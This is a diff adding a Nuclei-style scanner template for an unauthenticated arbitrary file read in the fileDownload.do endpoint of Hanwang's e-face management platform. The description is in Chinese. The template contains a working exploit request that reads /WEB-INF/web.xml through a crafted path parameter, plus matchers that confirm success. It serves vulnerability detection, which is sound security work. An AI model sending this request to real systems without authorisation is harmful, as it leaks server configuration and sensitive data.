@@ -1,0 +1,30 @@
+id: hanwang-fileDownload-fileread
+info:
+  name: 汉王e脸通综合管理平台 fileDownload.do 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 fileDownload.do 接口存在任意文件读取漏洞。攻击者可在无需认证的情况下，通过构造恶意请求访问 fileDownload.do 接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483744&idx=1&sn=5e07d8e440f171ef7f3ce5250701db56&chksm=9606e7f2a1716ee4f112c284aaec41ada350d03a18409c346efa7764d25ab56867fca8b67a1a&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,hanwang
+
+http:
+  - raw:
+      - |
+        GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','servlet')
+        condition: and
